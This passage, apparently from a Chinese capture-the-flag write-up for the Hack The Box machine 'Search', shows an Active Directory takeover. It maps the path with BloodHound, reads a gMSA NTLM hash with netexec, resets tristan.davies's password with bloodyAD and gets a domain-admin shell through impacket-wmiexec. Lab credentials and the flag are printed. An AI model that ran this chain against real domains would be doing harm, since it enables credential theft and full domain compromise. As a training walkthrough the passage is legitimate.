    unresolved = c.rpc_get_group_members(555, c.rdp)
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 804, in rpc_get_group_members
    raise e
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 774, in rpc_get_group_members
    resp = samr.hSamrGetMembersInAlias(dce,
                                       aliasHandle=resp['AliasHandle'])
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/samr.py", line 2728, in hSamrGetMembersInAlias
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1414, in request
    self.call(request.opnum, request, uuid)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1403, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1860, in send
    self._transport_send(data)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1797, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 543, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 569, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1742, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1444, in write
    ans = self.recvSMB(packetID)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 515, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 918, in recv_packet
    data = self.__read(timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1005, in __read
    data = self.read_function(4, timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 989, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 01M 33S
INFO: Compressing output into 20260814031422_bloodhound.zip
```

导入 bloodhound，可以查看到这样的提权路径。

`Sierra.Frye -> ITSEC -> BIR-ADFS-GMSA$ -> tristan.davies -> Domain Admins`

![](Pasted%20image%2020260814161437.png)

使用 nxc 查看 gMSA 的 NTLM hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ nxc ldap search.htb -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --gmsa
LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
LDAP        10.129.229.57   389    RESEARCH         [*] Getting GMSA Passwords
LDAP        10.129.229.57   389    RESEARCH         Account: BIR-ADFS-GMSA$       NTLM: e1e9fd9e46d0d747e1595167eedcec0f     PrincipalsAllowedToReadPassword: ITSec
 
```

使用 bloodyad 修改 tristan.davies 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ bloodyad -d search.htb -u 'BIR-ADFS-GMSA$' -p ':e1e9fd9e46d0d747e1595167eedcec0f' --host 10.129.229.57 set password tristan.davies 'P@ss123'
[+] Password changed successfully!
```

验证密码的正确性，显示 Pwn。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ nxc smb search.htb -u tristan.davies -p 'P@ss123'                   
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\tristan.davies:P@ss123 (Pwn3d!)

```

使用 wmiexec 拿到 root 环境。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Search]
└─$ impacket-wmiexec 'search.htb/tristan.davies:P@ss123'@10.129.229.57
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
search\tristan.davies

C:\>cd c:\Users\Administrator\Desktop
c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is B8F8-6F48

 Directory of c:\Users\Administrator\Desktop

22/11/2021  21:21    <DIR>          .
22/11/2021  21:21    <DIR>          ..
14/08/2026  02:45                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,142,725,632 bytes free

c:\Users\Administrator\Desktop>type root.txt
c44a3f5525e5edf9d392b90624919680
```

